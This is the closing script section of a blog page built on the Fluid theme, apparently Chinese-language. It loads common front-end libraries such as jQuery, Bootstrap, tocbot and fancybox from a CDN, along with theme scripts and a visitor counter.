    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
